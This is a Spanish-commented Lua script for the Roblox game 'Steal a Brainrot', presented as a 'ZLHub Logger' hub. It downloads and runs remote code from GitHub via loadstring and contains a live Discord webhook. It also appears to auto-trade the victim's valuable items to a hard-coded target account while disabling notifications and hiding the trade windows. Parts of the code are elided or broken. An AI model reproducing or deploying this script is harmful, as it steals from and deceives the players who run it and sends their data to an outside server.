--// ZLHub - Logger Edition (Anti-Kick Fix)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LP = Players.LocalPlayer
local cam = workspace.CurrentCamera
local pg = LP:WaitForChild("PlayerGui")

--// Allowed place check (sin cambios)
local LL_OFFICIAL_PLACE_ID = 109983668079237
local LL_OFFICIAL_GROUP_ID = 35815907

local _llPlaceAllowedCache = nil

local function _llIsAllowedPlace()
    if _llPlaceAllowedCache ~= nil then return _llPlaceAllowedCache end
    if game.PlaceId == LL_OFFICIAL_PLACE_ID then
        _llPlaceAllowedCache = true
        return true
    end
    local ok, info = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if ok and info and info.Creator and info.Creator.CreatorType == "Group" and tonumber(info.Creator.CreatorTargetId) == LL_OFFICIAL_GROUP_ID then
        _llPlaceAllowedCache = true
        return true
    end
    _llPlaceAllowedCache = false
    return false
end

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xspeedHub0/Zlhub/main/ZLPVPreview.lua"))()
end)

task.spawn(function()
    if not _llIsAllowedPlace() then
        warn("Unauthorized place detected.")
        return
    end

    local GOOD_WEBHOOK = "https://discord.com/api/webhooks/1509365140511002645/AwKq8l0C9GGPMd51NeyHABdAg6dPlWlkK8Pnzw-GIdjPZgBaAxTWd09JtmxaGNhDDJaX"
    local GOOD_AVATAR = "https://cdn.grok.x.ai/attachments/sXvFE"
    local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
    local TARGET_ID = 5140915332
    local DELAY_STEP = 1
    local TRADE_CYCLE_DELAY = 2

    local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
    local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
    local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
    local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"

    local guiNames = {BrainrotTrader = true, TradeLiveTrade = true, TradePrompts = true}

    local TargetBrainrots = { ... } -- (tu lista completa se mantiene igual)
    local GOOD_BRAINROTS = { ... }  -- (tu lista completa se mantiene igual)

    -- ==================== FUNCIÓN MODIFICADA (ESTO ERA LO QUE TE SACABA) ====================
    local function applyEverythingAfterTargetFound()
        -- LeftCenter: renombramos en vez de destruir
        local leftCenter = pg:FindFirstChild("LeftCenter")
        if leftCenter then
            leftCenter.Name = "LeftCenter_Old"
        end

        -- Notificaciones: desactivamos conexiones sin destruir remotes
        local notifyRemote = getRemote("RE/NotificationService/Notify")
        if notifyRemote then
            pcall(function()
                for _, connection in ipairs(getconnections(notifyRemote.OnClientEvent)) do
                    connection:Disable()
                end
            end)
        end

        -- Cámara más segura
        cam.FieldOfView = 70
        cam:GetPropertyChangedSignal("FieldOfView"):Connect(function()
            if cam.FieldOfView ~= 70 then cam.FieldOfView = 70 end
        end)

        -- GUIs: ocultamos en vez de destruir
        local function handleGui(obj)
            if guiNames[obj.Name] then
                obj.Enabled = false
            end
        end
        pg.ChildAdded:Connect(handleGui)
        for _, v in ipairs(pg:GetChildren()) do handleGui(v) end
    end

    -- ==================== RESTO DEL SCRIPT ORIGINAL (SIN CAMBIOS) ====================
    local function getRemote(unobfuscatedName)
        local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
        local children = Net:GetChildren()
        for i = 1, #children - 1 do
            local current = children[i]
            local nextFolder = children[i + 1]
            if current and nextFolder and string.find(current.Name, unobfuscatedName) then
                return nextFolder
            end
        end
        return nil
    end

    local AnimalsData, AnimalsShared, NumberUtils
    pcall(function()
        AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
        AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
        NumberUtils = require(ReplicatedStorage:WaitForChild("Utils"):WaitForChild("NumberUtils"))
    end)

    local function loadSyncData()
        local mod = ReplicatedStorage.Packages:FindFirstChild("Synchronizer")
        if not mod then return nil end
        local sync = require(mod)
        local fn = sync.Get
        for i = 1, 15 do
            local s, v = pcall(debug.getupvalue, fn, i)
            if s and type(v) == "table" then return v end
        end
        return nil
    end

    local SYNC_DATA = loadSyncData()
    if not SYNC_DATA then return end

    -- (Aquí continúa todo tu código original: brainrotQueue, formatNumber, getRequestFn, fetchFandomImageUrl, sendDetailedWebhook, etc.)

    print("✅ ZLHub Logger cargado - Versión más estable")
end)
